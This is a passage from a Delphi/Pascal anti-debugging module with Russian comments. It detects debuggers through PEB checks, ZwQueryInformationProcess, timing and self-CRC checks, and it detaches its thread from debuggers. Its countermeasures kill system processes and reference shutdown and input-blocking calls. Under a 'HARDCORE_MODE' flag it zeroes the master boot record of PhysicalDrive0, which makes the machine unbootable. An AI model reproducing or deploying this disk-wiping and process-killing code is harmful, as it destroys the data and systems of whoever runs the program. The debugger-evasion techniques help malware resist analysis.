      for I := 0 to ProcLength do
      begin
        KillTask(SystemProcesses[I]);
      end;
    end;

    {$IFDEF HARDCORE_MODE}
    if (TypeOfResistance and DestroyMBR) = DestroyMBR then
    begin
      hDrive := CreateFile('\\.\PhysicalDrive0', GENERIC_ALL, FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
      GetMem(Data, 512);
      FillChar(Data^, 512, #0);
      WriteFile(hDrive, Data^, 512, WrittenBytes, nil);
      CloseHandle(hDrive);
      FreeMem(Data);
    end;
    {$ENDIF}
  end;

  procedure ReStruct;
  var
    PrivilegesState: boolean;
  begin
    with PerimeterInfo do
    begin
      PrivilegesState := Debug.PrivilegesActivated;
      FillChar(Debug, SizeOf(Debug), #0);
      Debug.PrivilegesActivated := PrivilegesState;
      Functions.Main.Checksum := 0;
      Functions.Init.Checksum := 0;
      Functions.Stop.Checksum := 0;
    end;
  end;

var
  iCounterPerSec: TLargeInteger;
  T1, T2: TLargeInteger;
  ElapsedTime: single;

  DebuggerState, BreakpointState: byte;

// Для проверки памяти:
  Buffer: pointer;
  ByteReaded: Cardinal;

// Список процессов:
  IsProcExists: boolean;
  I: byte;

// Отладочные переменные:
  FullState: boolean;

{$IFDEF SINGLE_CORE}
// Перенос на отдельное ядро:
  ThreadID: LongWord;
  ThreadHandle: THandle;
{$ENDIF}

begin
{$IFDEF SINGLE_CORE}
// Выполняем на нулевом ядре:
  ThreadID := GetCurrentThreadId;
  ThreadHandle := OpenThread(PROCESS_ALL_ACCESS, false, ThreadId);
  SetThreadAffinityMask(ThreadHandle, 1);
  CloseHandle(ThreadHandle);
{$ENDIF}


// Задаём максимальный приоритет потока:
  SetThreadPriority(GetCurrentThread, THREAD_PRIORITY_TIME_CRITICAL);

  QueryPerformanceFrequency(iCounterPerSec);

  ProcLength := Length(Debuggers) - 1;

  // DebuggerState := $0D // не инициализируем, т.к. он инициализируется в первом условии
  BreakpointState := $0B;

  IsProcExists := false;

  while Active do
  begin
    ReStruct;
    FullState := false;

    if (TypeOfChecking and WINAPI_BP) = WINAPI_BP then
    begin
      QueryPerformanceCounter(T1);
    end;

    if (TypeOfChecking and PreventiveFlag) = PreventiveFlag then
    begin
      IsProcExists := false;
      for I := 0 to ProcLength do
      begin
        IsProcExists := IsProcExists or IsProcLaunched(Debuggers[I]);
      end;
      PerimeterInfo.Debug.PreventiveProcessesExists := IsProcExists;
    end;

    if (TypeOfChecking and ROM) = ROM then
    begin
      GetMem(Buffer, InitSize);
      ReadProcessMemory(Process, InitAddress, Buffer, InitSize, ByteReaded);
      PerimeterInfo.Functions.Init.Checksum := CRC32($FFFFFFFF, Buffer, ByteReaded);
      FreeMem(Buffer);

      GetMem(Buffer, StopSize);
      ReadProcessMemory(Process, StopAddress, Buffer, StopSize, ByteReaded);
      PerimeterInfo.Functions.Stop.Checksum := CRC32($FFFFFFFF, Buffer, ByteReaded);
      FreeMem(Buffer);

      GetMem(Buffer, MainSize);
      ReadProcessMemory(Process, MainAddress, Buffer, MainSize, ByteReaded);
      PerimeterInfo.Functions.Main.Checksum := CRC32($FFFFFFFF, Buffer, ByteReaded);
      FreeMem(Buffer);

      if (PerimeterInfo.Functions.Main.Checksum <> ValidMainCRC) or
         (PerimeterInfo.Functions.Init.Checksum <> ValidInitCRC) or
         (PerimeterInfo.Functions.Stop.Checksum <> ValidStopCRC)
      then
      begin
        PerimeterInfo.Debug.ROMFailure := true;
      end
      else
      begin
        PerimeterInfo.Debug.ROMFailure := false;
      end;
    end;

    if (TypeOfChecking and ExternalChecking) = ExternalChecking then
    begin
      PerimeterInfo.Debug.ExternalChecking.Value := ExternalGuard.OnChecking.ProcPtr;
      if PerimeterInfo.Debug.ExternalChecking.Value = ExternalGuard.OnChecking.DebuggerResult then
      begin
        PerimeterInfo.Debug.ExternalChecking.IsDebuggerExists := true;
        FullState := true;
      end;
    end;

    asm
      mov eax, TypeOfChecking
      mov ecx, ASM_A
      and eax, ecx
      cmp eax, ecx
      jne @Continue_A

    // Anti-Debugging A:
      mov eax, fs:[30h]
      mov eax, [eax+2]
      add eax, 65536
      mov PerimeterInfo.Debug.Asm_A.Value, eax
      test eax, eax
      jnz @A_Debugger

      mov PerimeterInfo.Debug.Asm_A.IsDebuggerExists, false
      jmp @Continue_A

@A_Debugger:
      mov PerimeterInfo.Debug.Asm_A.IsDebuggerExists, true

@Continue_A:

      mov eax, TypeOfChecking
      mov ecx, ASM_B
      and eax, ecx
      cmp eax, ecx
      jne @Continue_B

    // Anti-Debugging B:
      mov eax, fs:[30h]
      mov eax, [eax+68h]
      mov PerimeterInfo.Debug.Asm_B.Value, eax
      and eax, 70h
      test eax, eax
      jnz @B_Debugger

      mov PerimeterInfo.Debug.Asm_B.IsDebuggerExists, false
      jmp @Continue_B

@B_Debugger:
      mov PerimeterInfo.Debug.Asm_B.IsDebuggerExists, true

@Continue_B:

      mov eax, TypeOfChecking
      mov ecx, ZwSIT
      and eax, ecx
      cmp eax, ecx
      jne @Pass_ZwSIT

      push 0
      push 0
      push 11h
      push -2
      call ZwSetInformationThread // будем отключены от отладчика

@Pass_ZwSIT:

    // Финальный аккорд - используем ZwQueryInformationProcess
      mov eax, TypeOfChecking
      mov ecx, ZwQIP
      and eax, ecx
      cmp eax, ecx
      jne @Pass_ZwQIP

      push eax
      mov eax, esp
      push 0
      push 4 // ProcessInformationLength
      push eax
      push 1fh // ProcessDebugFlags
      push -1 // GetCurrentProcess()
      call ZwQueryInformationProcess
      pop eax
      test eax, eax
      je @ZwQIP_Debugger

        // Первый способ провалился? Не беда! Используем второй! :D
        // Однако этот способ может не работать в новых Windows NT!
        push  eax
        mov   eax, esp
        push  0
        push  2 // ProcessInformationLength
        push  eax
        // SystemKernelDebuggerInformation
        push  23h
        push  -1 // GetCurrentProcess()
        call  ZwQueryInformationProcess
        pop   eax
        test  ah, ah
        mov PerimeterInfo.Debug.ZwQIP.Value, eax
        jnz   @ZwQIP_Debugger

          // Не нашли отладчик?? О_о Бывает и такое...
          mov PerimeterInfo.Debug.ZwQIP.IsDebuggerExists, false
          jmp @Pass_ZwQIP

@ZwQIP_Debugger:
      mov PerimeterInfo.Debug.ZwQIP.IsDebuggerExists, true

@Pass_ZwQIP:
    end;

    with PerimeterInfo.Debug do
    begin
      FullState := FullState or
                   Asm_A.IsDebuggerExists or
                   Asm_B.IsDebuggerExists or
                   ZwQIP.IsDebuggerExists;
    end;

    if (TypeOfChecking and IDP) = IDP then
    begin
      PerimeterInfo.Debug.IsDebuggerPresent := IsDebuggerPresent;
    end;

    if (PerimeterInfo.Debug.IsDebuggerPresent = true) or
       (EmuDebugger = true) or
       ((IsProcExists = true) and ((TypeOfChecking and PreventiveFlag) = PreventiveFlag)) or
       (FullState = true) or
       (PerimeterInfo.Debug.ROMFailure = true)
    then
    begin
      if EmuDebugger = false then
        DebuggerState := $FD
      else
        DebuggerState := $ED;

      SendMessage(FormHandle, $FFF, DebuggerState, BreakpointState);

      if PerimeterInfo.Debug.ROMFailure = true then
        MessageType := 2
      else
        MessageType := 0;

      EliminateThreat;
    end
    else
    begin
      DebuggerState := $0D;
      SendMessage(FormHandle, $FFF, DebuggerState, BreakpointState);
    end;

    Sleep(Delay);

    if ((TypeOfChecking and WINAPI_BP) = WINAPI_BP) or
       (EmuBreakpoint = true)
    then
    begin
      QueryPerformanceCounter(T2);
      ElapsedTime := (T2 - T1) / iCounterPerSec;

      if (ElapsedTime > Delay + Delta) or (EmuBreakpoint = true) or (ElapsedTime <= 0) then
      begin
        if EmuBreakpoint = false then
          BreakpointState := $FB
        else
          BreakpointState := $EB;

        SendMessage(FormHandle, $FFF, DebuggerState, BreakpointState);
        MessageType := 1;
        EliminateThreat
      end
      else
      begin
        BreakpointState := $0B;
        SendMessage(FormHandle, $FFF, DebuggerState, BreakpointState);
      end;
    end
    else
    begin
    // Если проверка на брейкпоинты отключена,
    // то отправляем сообщение об их отсутствии:
      BreakpointState := $0B;
      SendMessage(FormHandle, $FFF, DebuggerState, BreakpointState);
    end;

  end;

// Посылаем сообщение о завершении работы:
  SendMessage(FormHandle, $FFF, $00, $00);

// Чистим память от адресов функций:
  asm
    xor eax, eax

    mov IsDebuggerPresent, eax;
    mov BlockInput, eax;
    mov ZwRaiseHardError, eax;
    mov ZwShutdownSystem, eax;
    mov ZwInitiatePowerAction, eax;
    mov LdrShutdownProcess, eax;
    mov ZwSetInformationThread, eax;

    mov OpenThread, eax;

    mov MsgBox, eax;

    mov QueryPerformanceCounter, eax;
    mov QueryPerformanceFrequency, eax;

    {$IFDEF SOUNDS}
    mov PlaySound, eax;
    {$ENDIF}
    mov Sleep, eax;

    mov SendMessage, eax;
  end;
  GlobalInitState := false;
  EndThread(0);
end;


procedure InitPerimeter(const PerimeterInputData: TPerimeterInputData);
var
// Переменные для инициализации основного процесса:
  ProcessID: LongWord;
  InitInt, StopInt, EmulateInt, MainInt: integer;
  EmulateAddress: pointer;

// Для "ленивой" проверки памяти:
  Buffer: pointer;
  ByteReaded: LongWord;
begin
  CRCInit;
  if not GlobalInitState then InitFunctions;

  with PerimeterInputData do
  begin
// Инициализируем наш процесс для возможности чтения памяти:
    GetWindowThreadProcessID(MainFormHandle, @ProcessID);
    Process := OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessID);

// Получаем адреса и размеры функций:
    InitAddress := @InitPerimeter;
    StopAddress := @StopPerimeter;
    EmulateAddress := @Emulate;
    MainAddress := @IsProcLaunched;

    InitInt := Integer(InitAddress);
    StopInt := Integer(StopAddress);
    EmulateInt := Integer(EmulateAddress);
    MainInt := Integer(MainAddress);

    InitSize := StopInt - InitInt;
    StopSize := EmulateInt - StopInt;
    MainSize := InitInt - MainInt;

    PerimeterInfo.Functions.Main.Address := MainAddress;
    PerimeterInfo.Functions.Main.Size := MainSize;
    PerimeterInfo.Functions.Main.ValidChecksum := ValidMainCRC;

    PerimeterInfo.Functions.Init.Address := InitAddress;
    PerimeterInfo.Functions.Init.Size := InitSize;
    PerimeterInfo.Functions.Init.ValidChecksum := ValidInitCRC;

    PerimeterInfo.Functions.Stop.Address := StopAddress;
    PerimeterInfo.Functions.Stop.Size := StopSize;
    PerimeterInfo.Functions.Stop.ValidChecksum := ValidStopCRC;

    if (CheckingsType and LazyROM) = LazyROM then
    begin
    //**************************************************************************
      GetMem(Buffer, InitSize);
      ReadProcessMemory(Process, InitAddress, Buffer, InitSize, ByteReaded);
      ValidInitCRC := CRC32($FFFFFFFF, Buffer, ByteReaded);
      FreeMem(Buffer);

      GetMem(Buffer, StopSize);
      ReadProcessMemory(Process, StopAddress, Buffer, StopSize, ByteReaded);
      ValidStopCRC := CRC32($FFFFFFFF, Buffer, ByteReaded);
      FreeMem(Buffer);


      GetMem(Buffer, MainSize);
      ReadProcessMemory(Process, MainAddress, Buffer, MainSize, ByteReaded);
      ValidMainCRC := CRC32($FFFFFFFF, Buffer, ByteReaded);
      FreeMem(Buffer);
    //**************************************************************************
    end;

// Сбрасываем генератор псевдослучайных чисел:
    Randomize;

// Получаем директивы противодействия:
    TypeOfResistance := ResistanceType;

// Получаем интервал между сканированием:
    Delay := Interval;

// Получаем включение и адреса внешних процедур:
    ExternalGuard.OnChecking.ProcPtr := ExtProcOnChecking.ProcPtr;
    ExternalGuard.OnChecking.DebuggerResult := ExtProcOnChecking.DebuggerResult;
    ExternalGuard.OnEliminating := ExtProcOnEliminating;

// Запускаем защиту:
    Active := true;
    FormHandle := MainFormHandle;

// Убеждаемся в выключении эмуляции:
    //EmuDebugger := false;
    //EmuBreakpoint := false;

    TypeOfChecking := CheckingsType;

    ThreadHandle := BeginThread(nil, 0, Addr(MainThread), nil, 0, ThreadID);
    CloseHandle(ThreadHandle);
  end;

// Посылаем сообщение об успешном запуске:
  SendMessage(FormHandle, $FFF, $FF, $FF);
end;

procedure StopPerimeter;
begin
  Active := false; // Сигнал к завершению основного потока

// Очистка адресов функций перенесена в MainThread

// Выключаем эмуляцию отладчика и брейкпоинта:
  //EmuDebugger := false;
  //EmuBreakpoint := false;
end;

procedure Emulate(Debugger: boolean; Breakpoint: boolean);
begin
  EmuDebugger := Debugger;
  EmuBreakpoint := Breakpoint;
end;

procedure ChangeParameters(ResistanceType: LongWord; CheckingType: LongWord);
begin
  TypeOfResistance := ResistanceType;
  TypeOfChecking := CheckingType;
end;

procedure ChangeExternalProcedures(OnCheckingProc: pointer; DebuggerValue: LongWord; OnEliminatingProc: pointer);
begin
  ExternalGuard.OnChecking.ProcPtr := OnCheckingProc;
  ExternalGuard.OnChecking.DebuggerResult := DebuggerValue;
  ExternalGuard.OnEliminating := OnEliminatingProc;
end;

end.
